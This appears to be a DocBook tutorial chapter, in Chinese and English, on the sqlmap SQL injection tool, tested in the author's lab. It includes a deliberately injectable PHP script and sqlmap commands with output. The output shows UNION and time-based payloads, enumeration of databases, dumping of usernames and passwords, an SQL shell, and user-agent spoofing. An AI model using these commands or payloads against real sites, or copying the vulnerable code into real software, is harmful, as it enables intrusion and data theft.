@@ -1,0 +1,856 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- $Id: chapter.sqlmap.xml 369 2012-03-10 10:42:28Z netkiller $ -->
+<chapter id="sqlmap">
+	<title>sqlmap - automatic SQL injection and database takeover tool</title>
+	<para>http://sqlmap.sourceforge.net/</para>
+	<para>sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.</para>
+	<section id="sqlmap.installation">
+		<title>Installation</title>
+		<screen>
+$ apt-cache search sqlmap
+sqlmap - automatic SQL injection tool
+
+$ sudo apt-get install sqlmap
+
+$ dpkg -s sqlmap
+		</screen>
+		<para>安装开发板</para>
+		<screen>
+sudo svn checkout https://svn.sqlmap.org/sqlmap/trunk/sqlmap sqlmap-dev
+
+sudo vim ~/.bashrc
+
+#行尾加上：
+alias sqlmap='python /home/neo/sqlmap-dev/sqlmap.py'
+
+该环境变量只对当前用户有效
+
+如果想对所有用户有效 可设置全局 文件/etc/profile
+		</screen>
+		<para>sqlmap参数</para>
+		<screen>
+		<![CDATA[
+$ sqlmap-dev/sqlmap.py -h
+
+    sqlmap/1.0-dev (r4577) - automatic SQL injection and database takeover tool
+    http://www.sqlmap.org
+
+[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 18:05:44
+
+Usage: python sqlmap-dev/sqlmap.py [options]
+
+Options:
+  --version             show program's version number and exit
+  -h, --help            show this help message and exit
+  -v VERBOSE            Verbosity level: 0-6 (default 1)
+
+  Target:
+    At least one of these options has to be specified to set the source to
+    get target urls from.
+
+    -d DIRECT           Direct connection to the database
+    -u URL, --url=URL   Target url
+    -l LOGFILE          Parse targets from Burp or WebScarab proxy logs
+    -m BULKFILE         Scan multiple targets enlisted in a given textual file
+    -r REQUESTFILE      Load HTTP request from a file
+    -g GOOGLEDORK       Process Google dork results as target urls
+    -c CONFIGFILE       Load options from a configuration INI file
+
+  Request:
+    These options can be used to specify how to connect to the target url.
+
+    --data=DATA         Data string to be sent through POST
+    --param-del=PDEL    Character used for splitting parameter values
+    --cookie=COOKIE     HTTP Cookie header
+    --cookie-urlencode  URL Encode generated cookie injections
+    --drop-set-cookie   Ignore Set-Cookie header from response
+    --user-agent=AGENT  HTTP User-Agent header
+    --random-agent      Use randomly selected HTTP User-Agent header
+    --randomize=RPARAM  Randomly change value for given parameter(s)
+    --referer=REFERER   HTTP Referer header
+    --headers=HEADERS   Extra HTTP headers newline separated
+    --auth-type=ATYPE   HTTP authentication type (Basic, Digest or NTLM)
+    --auth-cred=ACRED   HTTP authentication credentials (name:password)
+    --auth-cert=ACERT   HTTP authentication certificate (key_file,cert_file)
+    --proxy=PROXY       Use a HTTP proxy to connect to the target url
+    --proxy-cred=PCRED  HTTP proxy authentication credentials (name:password)
+    --ignore-proxy      Ignore system default HTTP proxy
+    --delay=DELAY       Delay in seconds between each HTTP request
+    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
+    --retries=RETRIES   Retries when the connection timeouts (default 3)
+    --scope=SCOPE       Regexp to filter targets from provided proxy log
+    --safe-url=SAFURL   Url address to visit frequently during testing
+    --safe-freq=SAFREQ  Test requests between two visits to a given safe url
+    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
+                        "import hashlib;id2=hashlib.md5(id).hexdigest()")
+
+  Optimization:
+    These options can be used to optimize the performance of sqlmap.
+
+    -o                  Turn on all optimization switches
+    --predict-output    Predict common queries output
+    --keep-alive        Use persistent HTTP(s) connections
+    --null-connection   Retrieve page length without actual HTTP response body
+    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
+
+  Injection:
+    These options can be used to specify which parameters to test for,
+    provide custom injection payloads and optional tampering scripts.
+
+    -p TESTPARAMETER    Testable parameter(s)
+    --dbms=DBMS         Force back-end DBMS to this value
+    --os=OS             Force back-end DBMS operating system to this value
+    --prefix=PREFIX     Injection payload prefix string
+    --suffix=SUFFIX     Injection payload suffix string
+    --logic-negative    Use logic operation(s) instead of negating values
+    --skip=SKIP         Skip testing for given parameter(s)
+    --tamper=TAMPER     Use given script(s) for tampering injection data
+
+  Detection:
+    These options can be used to specify how to parse and compare page
+    content from HTTP responses when using blind SQL injection technique.
+
+    --level=LEVEL       Level of tests to perform (1-5, default 1)
+    --risk=RISK         Risk of tests to perform (0-3, default 1)
+    --string=STRING     String to match in the response when query is valid
+    --regexp=REGEXP     Regexp to match in the response when query is valid
+    --code=CODE         HTTP response code to match when the query is valid
+    --text-only         Compare pages based only on the textual content
+    --titles            Compare pages based only on their titles
+
+  Techniques:
+    These options can be used to tweak testing of specific SQL injection
+    techniques.
+
+    --technique=TECH    SQL injection techniques to test for (default "BEUST")
+    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
+    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
+    --union-char=UCHAR  Character to use for bruteforcing number of columns
+
+  Fingerprint:
+    -f, --fingerprint   Perform an extensive DBMS version fingerprint
+
+  Enumeration:
+    These options can be used to enumerate the back-end database
+    management system information, structure and data contained in the
+    tables. Moreover you can run your own SQL statements.
+
+    -b, --banner        Retrieve DBMS banner
+    --current-user      Retrieve DBMS current user
+    --current-db        Retrieve DBMS current database
+    --is-dba            Detect if the DBMS current user is DBA
+    --users             Enumerate DBMS users
+    --passwords         Enumerate DBMS users password hashes
+    --privileges        Enumerate DBMS users privileges
+    --roles             Enumerate DBMS users roles
+    --dbs               Enumerate DBMS databases
+    --tables            Enumerate DBMS database tables
+    --columns           Enumerate DBMS database table columns
+    --schema            Enumerate DBMS schema
+    --count             Retrieve number of entries for table(s)
+    --dump              Dump DBMS database table entries
+    --dump-all          Dump all DBMS databases tables entries
+    --search            Search column(s), table(s) and/or database name(s)
+    -D DB               DBMS database to enumerate
+    -T TBL              DBMS database table to enumerate
+    -C COL              DBMS database table column to enumerate
+    -U USER             DBMS user to enumerate
+    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
+    --start=LIMITSTART  First query output entry to retrieve
+    --stop=LIMITSTOP    Last query output entry to retrieve
+    --first=FIRSTCHAR   First query output word character to retrieve
+    --last=LASTCHAR     Last query output word character to retrieve
+    --sql-query=QUERY   SQL statement to be executed
+    --sql-shell         Prompt for an interactive SQL shell
+
+  Brute force:
+    These options can be used to run brute force checks.
+
+    --common-tables     Check existence of common tables
+    --common-columns    Check existence of common columns
+
+  User-defined function injection:
+    These options can be used to create custom user-defined functions.
+
+    --udf-inject        Inject custom user-defined functions
+    --shared-lib=SHLIB  Local path of the shared library
+
+  File system access:
+    These options can be used to access the back-end database management
+    system underlying file system.
+
+    --file-read=RFILE   Read a file from the back-end DBMS file system
+    --file-write=WFILE  Write a local file on the back-end DBMS file system
+    --file-dest=DFILE   Back-end DBMS absolute filepath to write to
+
+  Operating system access:
+    These options can be used to access the back-end database management
+    system underlying operating system.
+
+    --os-cmd=OSCMD      Execute an operating system command
+    --os-shell          Prompt for an interactive operating system shell
+    --os-pwn            Prompt for an out-of-band shell, meterpreter or VNC
+    --os-smbrelay       One click prompt for an OOB shell, meterpreter or VNC
+    --os-bof            Stored procedure buffer overflow exploitation
+    --priv-esc          Database process' user privilege escalation
+    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
+    --tmp-path=TMPPATH  Remote absolute path of temporary files directory
+
+  Windows registry access:
+    These options can be used to access the back-end database management
+    system Windows registry.
+
+    --reg-read          Read a Windows registry key value
+    --reg-add           Write a Windows registry key value data
+    --reg-del           Delete a Windows registry key value
+    --reg-key=REGKEY    Windows registry key
+    --reg-value=REGVAL  Windows registry key value
+    --reg-data=REGDATA  Windows registry key value data
+    --reg-type=REGTYPE  Windows registry key value type
+
+  General:
+    These options can be used to set some general working parameters.
+
+    -s SESSIONFILE      Save and resume all data retrieved on a session file
+    -t TRAFFICFILE      Log all HTTP traffic into a textual file
+    --batch             Never ask for user input, use the default behaviour
+    --charset=CHARSET   Force character encoding used for data retrieval
+    --check-tor         Check to see if Tor is used properly
+    --crawl=CRAWLDEPTH  Crawl the website starting from the target url
+    --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
+    --eta               Display for each output the estimated time of arrival
+    --flush-session     Flush session file for current target
+    --forms             Parse and test forms on target url
+    --fresh-queries     Ignores query results stored in session file
+    --parse-errors      Parse and display DBMS error messages from responses
+    --replicate         Replicate dumped data into a sqlite3 database
+    --save              Save options on a configuration INI file
+    --tor               Use default Tor SOCKS5 proxy address
+    --update            Update sqlmap
+
+  Miscellaneous:
+    -z MNEMONICS        Use mnemonics for shorter parameter setup
+    --beep              Alert when sql injection found
+    --check-payload     Offline WAF/IPS/IDS payload detection testing
+    --check-waf         Check for existence of WAF/IPS/IDS protection
+    --cleanup           Clean up the DBMS by sqlmap specific UDF and tables
+    --dependencies      Check for missing sqlmap dependencies
+    --gpage=GOOGLEPAGE  Use Google dork results from specified page number
+    --mobile            Imitate smartphone through HTTP User-Agent header
+    --page-rank         Display page rank (PR) for Google dork results
+    --smart             Conduct through tests only if positive heuristic(s)
+    --wizard            Simple wizard interface for beginner users
+
+[*] shutting down at 18:05:44
+
+		]]>
+		</screen>
+	</section>
+	<section id="sqlmap.script">
+		<title>开始入住实验</title>
+		<para>当你运行sqlmap的时候，我建议你运行下面命令监控你的web服务器日志</para>
+		<screen>
+ tail -f access.log
+		</screen>
+		<section>
+			<title>测试脚本</title>
+			<screen>
+			<![CDATA[
+<?php
+    $mysql_server_name="172.16.0.4";
+    $mysql_username="dbuser";
+    $mysql_password="dbpass";
+    $mysql_database="dbname";
+
+
+    $conn=mysql_connect($mysql_server_name, $mysql_username,
+                        $mysql_password);
+	$strsql="";
+	if($_GET['id']){
+		$strsql="select * from `order` where id=".$_GET['id'];
+	}else{
+	    $strsql="select * from `order` limit 100";
+	}
+	echo $strsql;
+    $result=@mysql_db_query($mysql_database, $strsql, $conn);
+
+    $row=mysql_fetch_row($result);
+
+    echo '<font face="verdana">';
+    echo '<table border="1" cellpadding="1" cellspacing="2">';
+
+
+    echo "\n<tr>\n";
+    for ($i=0; $i<mysql_num_fields($result); $i++)
+    {
+      echo '<td bgcolor="#000F00"><b>'.
+      mysql_field_name($result, $i);
+      echo "</b></td>\n";
+    }
+    echo "</tr>\n";
+
+    mysql_data_seek($result, 0);
+
+    while ($row=mysql_fetch_row($result))
+    {
+      echo "<tr>\n";
+      for ($i=0; $i<mysql_num_fields($result); $i++ )
+      {
+        echo '<td bgcolor="#00FF00">';
+        echo "$row[$i]";
+        echo '</td>';
+      }
+      echo "</tr>\n";
+    }
+
+    echo "</table>\n";
+    echo "</font>";
+
+    mysql_free_result($result);
+
+    mysql_close();
+			]]>
+			</screen>
+		</section>
+		<section>
+			<title>sqlmap.ini</title>
+			<screen>
+vim ~/.sqlmap/sqlmap.ini
+
+[Target]
+googledork =
+list =
+url = http://172.16.0.44/test/testdb.php?id=12
+
+[Request]
+acred =
+atype =
+agent =
+cookie =
+data =
+delay = 0
+headers =
+method = GET
+proxy =
+referer = http://www.google.com
+threads = 1
+timeout = 10
+useragentsfile =
+
+[Miscellaneous]
+batch = False
+eta = False
+sessionfile =
+updateall = False
+verbose = 1
+
+[Enumeration]
+col =
+db =
+dumpall = False
+dumptable = False
+excludesysdbs = False
+getbanner = False
+getcolumns = False
+getcurrentdb = False
+getcurrentuser = False
+getdbs = False
+getpasswordhashes = False
+getprivileges = False
+gettables = False
+getusers = False
+isdba = False
+limitstart = 0
+limitstop = 0
+query =
+sqlshell = False
+tbl =
+user =
+
+[File system]
+rfile =
+wfile =
+
+[Takeover]
+osshell = False
+
+[Fingerprint]
+extensivefp = False
+
+[Injection]
+dbms =
+eregexp =
+estring =
+postfix =
+prefix =
+regexp =
+string =
+testparameter =
+
+[Techniques]
+stackedtest = False
+timetest = False
+utech =
+uniontest = False
+unionuse = False
+
+			</screen>
+		</section>
+
+	</section>
+	<section id="sqlmap.request">
+		<title>Request参数</title>
+		<section>
+			<title>--method, --data</title>
+			<screen>
+			<![CDATA[
+sqlmap -u "http://www.example.com/login.php" --method "POST" --data "user=neo&passwd=chen"
+			]]>
+			</screen>
+		</section>
+		<section>
+			<title>--cookie</title>
+		</section>
+		<section>
+			<title>--referer</title>
+			<screen>
+$ sqlmap -u "http://172.16.0.44/test/testdb.php?id=12" --referer="http://www.google.com"
+			</screen>
+			<para>access.log输出</para>
+			<screen>
+113.106.63.1 - - [10/Dec/2011:16:52:41 +0800] "GET /test/testdb.php?id=12%29%20AND%20%288621=8621 HTTP/1.1" 200 978 "http://www.google.com" "sqlmap/0.6.4 (http://sqlmap.sourceforge.net)"
+113.106.63.1 - - [10/Dec/2011:16:52:41 +0800] "GET /test/testdb.php?id=12%29%29%20AND%20%28%282589=2589 HTTP/1.1" 200 980 "http://www.google.com" "sqlmap/0.6.4 (http://sqlmap.sourceforge.net)"
+			</screen>
+		</section>
+		<section>
+			<title>--user-agent</title>
+			<para>默认是 "sqlmap/0.6.4 (http://sqlmap.sourceforge.net)"</para>
+			<para>检查Your User Agent: http://whatsmyuseragent.com/</para>
+			<para>Chrome</para>
+			<screen>
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2
+			</screen>
+			<para>IE9</para>
+			<screen>
+Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+			</screen>
+			<para>Safari</para>
+			<screen>
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.52.7 (KHTML, like Gecko) Version/5.1.2 Safari/534.52.7
+			</screen>
+			<para>首先开启日志监控</para>
+			<screen>
+tail -f /www/logs/access.log
+			</screen>
+			<para>伪装成Safari</para>
+			<screen>
+$ sqlmap -u "http://172.16.0.44/test/testdb.php?id=12" --user-agent="Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.52.7 (KHTML, like Gecko) Version/5.1.2 Safari/534.52.7"
+			</screen>
+			<para>access.log输出结果</para>
+			<screen>
+113.106.63.1 - - [10/Dec/2011:16:48:24 +0800] "GET /test/testdb.php?id=12%20AND%20ORD%28MID%28%28SELECT%200%20FROM%20information_schema.TABLES%20LIMIT%200%2C%201%29%2C%202%2C%201%29%29%20%3E%203%20AND%201184=1184 HTTP/1.1" 200 2191 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.52.7 (KHTML, like Gecko) Version/5.1.2 Safari/534.52.7"
+113.106.63.1 - - [10/Dec/2011:16:48:24 +0800] "GET /test/testdb.php?id=12%20AND%20ORD%28MID%28%28SELECT%200%20FROM%20information_schema.TABLES%20LIMIT%200%2C%201%29%2C%202%2C%201%29%29%20%3E%201%20AND%201184=1184 HTTP/1.1" 200 2191 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.52.7 (KHTML, like Gecko) Version/5.1.2 Safari/534.52.7"
+			</screen>
+			<section>
+				<title>-a</title>
+			</section>
+		</section>
+		<section>
+			<title>--headers</title>
+		</section>
+		<section>
+			<title>auth</title>
+			<section>
+				<title>--auth-type</title>
+			</section>
+			<section>
+				<title>--auth-cred</title>
+			</section>
+		</section>
+		<section>
+			<title>--proxy</title>
+		</section>
+		<section>
+			<title></title>
+		</section>
+		<section>
+			<title>--threads</title>
+		</section>
+		<section>
+			<title>--delay</title>
+		</section>
+		<section>
+			<title>--timeout</title>
+		</section>
+	</section>
+	<section id="sqlmap.injection">
+		<title>Injection</title>
+		<section>
+			<title>--dbms</title>
+			<screen>
+neo@neo-OptiPlex-380:~$ sqlmap -u "http://172.16.0.44/test/testdb.php?id=12" --dbms "mysql"
+
+[*] starting at: 17:39:43
+
+[17:39:43] [INFO] testing connection to the target url
+[17:39:43] [INFO] testing if the url is stable, wait a few seconds
+[17:39:44] [INFO] url is stable
+[17:39:44] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
+[17:39:44] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
+[17:39:44] [INFO] testing if GET parameter 'id' is dynamic
+[17:39:44] [INFO] confirming that GET parameter 'id' is dynamic
+[17:39:44] [INFO] GET parameter 'id' is dynamic
+[17:39:44] [INFO] testing sql injection on GET parameter 'id' with 0 parenthesis
+[17:39:44] [INFO] testing unescaped numeric injection on GET parameter 'id'
+[17:39:44] [INFO] confirming unescaped numeric injection on GET parameter 'id'
+[17:39:44] [INFO] GET parameter 'id' is unescaped numeric injectable with 0 parenthesis
+[17:39:44] [INFO] testing for parenthesis on injectable parameter
+[17:39:44] [INFO] the injectable parameter requires 0 parenthesis
+[17:39:44] [INFO] testing MySQL
+[17:39:44] [INFO] confirming MySQL
+[17:39:44] [INFO] query: SELECT 2 FROM information_schema.TABLES LIMIT 0, 1
+[17:39:44] [INFO] retrieved: 2
+[17:39:45] [INFO] performed 13 queries in 0 seconds
+[17:39:45] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.0
+
+
+[*] shutting down at: 17:39:45
+			</screen>
+		</section>
+		<section>
+			<title>--prefix</title>
+		</section>
+		<section>
+			<title>--postfix</title>
+		</section>
+		<section>
+			<title>--string</title>
+		</section>
+		<section>
+			<title>--regexp</title>
+		</section>
+		<section>
+			<title>--excl-str</title>
+		</section>
+		<section>
+			<title>--excl-reg</title>
+		</section>
+	</section>
+	<section id="sqlmap.techniques">
+		<title>Techniques</title>
+		<section>
+			<title>--stacked-test</title>
+
+		</section>
+		<section>
+			<title>--time-test</title>
+		</section>
+		<section>
+			<title>--union-test</title>
+			<screen>
+$ sqlmap -u "http://172.16.0.44/team.php?id=3429" --union-test
+			</screen>
+		</section>
+		<section>
+			<title>--union-tech</title>
+
+		</section>
+		<section>
+			<title>--union-use</title>
+		</section>
+	</section>
+	<section id="sqlmap.enumeration">
+		<title>Enumeration</title>
+		<section>
+			<title>dbs</title>
+			<screen>
+$ sqlmap -u "http://172.16.0.44/test/testdb.php?id=12" --dbs
+			</screen>
+			<screen>
+[*] starting at: 15:59:20
+
+[15:59:20] [INFO] testing connection to the target url
+[15:59:20] [INFO] testing if the url is stable, wait a few seconds
+[15:59:22] [INFO] url is stable
+[15:59:22] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
+[15:59:22] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
+[15:59:22] [INFO] testing if GET parameter 'id' is dynamic
+[15:59:22] [INFO] confirming that GET parameter 'id' is dynamic
+[15:59:22] [INFO] GET parameter 'id' is dynamic
+[15:59:22] [INFO] testing sql injection on GET parameter 'id' with 0 parenthesis
+[15:59:22] [INFO] testing unescaped numeric injection on GET parameter 'id'
+[15:59:22] [INFO] confirming unescaped numeric injection on GET parameter 'id'
+[15:59:22] [INFO] GET parameter 'id' is unescaped numeric injectable with 0 parenthesis
+[15:59:22] [INFO] testing for parenthesis on injectable parameter
+[15:59:22] [INFO] the injectable parameter requires 0 parenthesis
+[15:59:22] [INFO] testing MySQL
+[15:59:22] [INFO] confirming MySQL
+[15:59:22] [INFO] query: SELECT 2 FROM information_schema.TABLES LIMIT 0, 1
+[15:59:22] [INFO] retrieved: 2
+[15:59:22] [INFO] performed 13 queries in 0 seconds
+[15:59:22] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.0
+
+[15:59:22] [INFO] fetching database names
+[15:59:22] [INFO] fetching number of databases
+[15:59:22] [INFO] query: SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR(10000)), CHAR(32)) FROM information_schema.SCHEMATA
+[15:59:22] [INFO] retrieved: 3
+[15:59:23] [INFO] performed 13 queries in 0 seconds
+[15:59:23] [INFO] query: SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR(10000)), CHAR(32))) FROM information_schema.SCHEMATA LIMIT 0, 1
+[15:59:23] [INFO] retrieved: information_schema
+[15:59:27] [INFO] performed 132 queries in 4 seconds
+[15:59:27] [INFO] query: SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR(10000)), CHAR(32))) FROM information_schema.SCHEMATA LIMIT 1, 1
+[15:59:27] [INFO] retrieved: groupgoods
+[15:59:29] [INFO] performed 76 queries in 2 seconds
+[15:59:29] [INFO] query: SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR(10000)), CHAR(32))) FROM information_schema.SCHEMATA LIMIT 2, 1
+[15:59:29] [INFO] retrieved: test
+[15:59:30] [INFO] performed 34 queries in 1 seconds
+available databases [3]:
+[*] groupgoods
+[*] information_schema
+[*] test
+
+[15:59:30] [INFO] Fetched data logged to text files under '/home/neo/.sqlmap/output/172.16.0.44'
+
+[*] shutting down at: 15:59:30
+			</screen>
+		</section>
+		<section>
+			<title>--count</title>
+			<screen>
+			<![CDATA[
+$ sqlmap -u "http://localhost/test.php?id=98" --count
+
+    sqlmap/1.0-dev (r4843) - automatic SQL injection and database takeover tool
+    http://www.sqlmap.org
+
+[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 14:36:50
+
+[14:36:51] [INFO] using '/home/neo/sqlmap-dev/output/localhost/session' as session file
+[14:36:51] [INFO] resuming back-end DBMS 'mysql 5.0.11' from session file
+[14:36:51] [INFO] testing connection to the target url
+[14:36:51] [INFO] heuristics detected web page charset 'ascii'
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=98 AND 4108=4108
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: id=98 UNION ALL SELECT CONCAT(0x3a6b79703a,0x57596b57416f63567046,0x3a6c757a3a), NULL, NULL#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=98 AND SLEEP(5)
+---
+
+[14:36:51] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx, PHP 5.3.6
+back-end DBMS: MySQL 5.0.11
+[14:36:51] [WARNING] missing table parameter, sqlmap will retrieve the number of entries for all database management system databases' tables
+[14:36:51] [INFO] fetching database names
+[14:36:51] [INFO] fetching tables for databases: information_schema, mysql, neo, performance_schema, test
+[14:36:52] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[14:36:52] [INFO] retrieved: 
+[14:36:52] [INFO] retrieved: 
+[14:36:52] [INFO] retrieved: 
+[14:36:53] [INFO] retrieved: 
+[14:36:53] [INFO] retrieved: 
+[14:36:53] [INFO] retrieved: 
+[14:36:53] [INFO] retrieved: 
+[14:36:53] [INFO] retrieved: 
+[14:36:53] [INFO] retrieved: 
+[14:36:53] [INFO] retrieved: 
+[14:36:53] [INFO] retrieved: 
+[14:36:54] [INFO] retrieved: 
+[14:36:54] [INFO] retrieved: 
+[14:36:54] [INFO] retrieved: 
+[14:36:54] [INFO] retrieved: 
+[14:36:54] [INFO] retrieved: 
+[14:36:54] [INFO] retrieved: 
+Database: neo
++---------------------------------------+---------+
+| Table                                 | Entries |
++---------------------------------------+---------+
+| test                                  | 43      |
+| stuff                                 | 4       |
+| users                                 | 3       |
++---------------------------------------+---------+
+
+Database: information_schema
++---------------------------------------+---------+
+| Table                                 | Entries |
++---------------------------------------+---------+
+| COLUMNS                               | 667     |
+| GLOBAL_STATUS                         | 291     |
+| SESSION_STATUS                        | 291     |
+| GLOBAL_VARIABLES                      | 276     |
+| SESSION_VARIABLES                     | 276     |
+| USER_PRIVILEGES                       | 138     |
+| COLLATION_CHARACTER_SET_APPLICABILITY | 128     |
+| COLLATIONS                            | 127     |
+| PARTITIONS                            | 90      |
+| TABLES                                | 80      |
+| STATISTICS                            | 78      |
+| KEY_COLUMN_USAGE                      | 64      |
+| CHARACTER_SETS                        | 36      |
+| SCHEMA_PRIVILEGES                     | 36      |
+| TABLE_CONSTRAINTS                     | 35      |
+| PLUGINS                               | 10      |
+| ENGINES                               | 8       |
+| SCHEMATA                              | 5       |
+| PROCESSLIST                           | 1       |
++---------------------------------------+---------+
+
+Database: mysql
++---------------------------------------+---------+
+| Table                                 | Entries |
++---------------------------------------+---------+
+| help_relation                         | 1028    |
+| help_topic                            | 508     |
+| help_keyword                          | 465     |
+| help_category                         | 38      |
+| user                                  | 8       |
+| db                                    | 3       |
+| proxies_priv                          | 2       |
++---------------------------------------+---------+
+
+[14:36:57] [INFO] Fetched data logged to text files under '/home/neo/sqlmap-dev/output/localhost'
+
+[*] shutting down at 14:36:57
+			
+			]]>
+			</screen>
+		</section>
+		<section>
+			<title>--dump/--dump-all</title>
+			<screen>
+			<![CDATA[
+$ sqlmap -u "http://localhost/test.php?id=98" --dump-all --flush-session			
+			]]>
+			</screen>
+		</section>
+		<section>
+			<title>--sql-query</title>
+			<screen>
+$ sqlmap -u "http://localhost/test.php?id=98" --sql-query="SELECT username, password FROM test"
+
+    sqlmap/1.0-dev (r4843) - automatic SQL injection and database takeover tool
+    http://www.sqlmap.org
+
+[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 15:46:57
+
+[15:46:58] [INFO] using '/home/neo/sqlmap-dev/output/localhost/session' as session file
+[15:46:58] [INFO] resuming back-end DBMS 'mysql 5.0.11' from session file
+[15:46:58] [INFO] testing connection to the target url
+[15:46:58] [INFO] heuristics detected web page charset 'ascii'
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=98 AND 4108=4108
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: id=98 UNION ALL SELECT CONCAT(0x3a6b79703a,0x57596b57416f63567046,0x3a6c757a3a), NULL, NULL#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=98 AND SLEEP(5)
+---
+
+[15:46:58] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx, PHP 5.3.6
+back-end DBMS: MySQL 5.0.11
+[15:46:58] [INFO] fetching SQL SELECT statement query output: 'SELECT username, password FROM test'
+SELECT username, password FROM test [6]:
+[*] neo, chen
+[*] jam, zheng
+[*] john, meng
+[*] neo1, chen
+[*] jam2, zheng
+[*] john3, meng
+
+[15:46:58] [INFO] Fetched data logged to text files under '/home/neo/sqlmap-dev/output/localhost'
+
+[*] shutting down at 15:46:58			
+			</screen>
+		</section>
+		<section>
+			<title>--sql-shell</title>
+			<screen>
+			<![CDATA[
+$ sqlmap -u "http://localhost/test.php?id=98" -v 1 --sql-shell 
+
+    sqlmap/1.0-dev (r4812) - automatic SQL injection and database takeover tool
+    http://www.sqlmap.org
+
+[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 09:54:39
+
+[09:54:40] [INFO] using '/home/neo/sqlmap-dev/output/localhost/session' as session file
+[09:54:40] [INFO] resuming back-end DBMS 'mysql 5.0.11' from session file
+[09:54:40] [INFO] testing connection to the target url
+[09:54:40] [INFO] heuristics detected web page charset 'ascii'
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=98 AND 8779=8779
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: id=98 UNION ALL SELECT NULL, CONCAT(0x3a72776a3a,0x546a7a6578746f575762,0x3a62746d3a), NULL#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=98 AND SLEEP(5)
+---
+
+[09:54:40] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx, PHP 5.3.6
+back-end DBMS: MySQL 5.0.11
+[09:54:40] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
+sql-shell> select * from test;
+[*] chen, 98, neo
+[*] chen, 111, neo
+[*] zheng, 112, jam
+sql-shell>
+			]]>
+			</screen>
+		</section>
+	</section>
+	<section id="sqlmap.miscellaneous">
+		<title>Miscellaneous</title>
+		<section>
+			<title>--update</title>
+			<screen>
+$ sqlmap --update
+			</screen>
+		</section>
+		<section>
+			<title>--save</title>
+			<screen>
+$ sqlmap -u "http://172.16.0.44/test/testdb.php?id=12" --referer="http://www.google.com" --save sqlmap.ini
+			</screen>
+		</section>
+	</section>
+</chapter>
